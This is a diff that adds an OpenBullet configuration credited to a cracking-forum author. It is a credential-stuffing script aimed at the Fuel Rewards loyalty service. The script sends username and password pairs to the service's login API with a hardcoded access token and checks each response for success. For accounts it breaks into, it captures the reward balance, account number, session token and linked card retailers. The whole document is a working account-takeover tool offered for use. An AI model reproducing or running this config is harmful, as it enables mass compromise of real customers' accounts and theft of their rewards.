@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "FUELREWARDS",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-02T21:54:00.9312038-05:00",
+  "AdditionalInfo": "",
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/login" 
+  CONTENT "{\"userId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "access_token: 739c6f19-1fbc-410b-bd7a-1ab418ca4683" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+  KEYCHAIN Failure OR 
+    KEY "This User does not have access to this web service" 
+
+PARSE "<SOURCE>" LR "\"rewardBalance\":" "," CreateEmpty=FALSE -> CAP "" "$" "" 
+
+PARSE "<SOURCE>" LR "\",\"accountNumber\":\"" "\",\"" -> VAR "ID" 
+
+PARSE "<SOURCE>" LR "\"token\":{\"memberAccessToken\":\"" "\",\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/members/<ID>/cards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "memberAccessToken: <TOKEN>" 
+
+PARSE "<SOURCE>" LR ",\"retailerName\":\"" "\",\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "CARD(S)" 
+
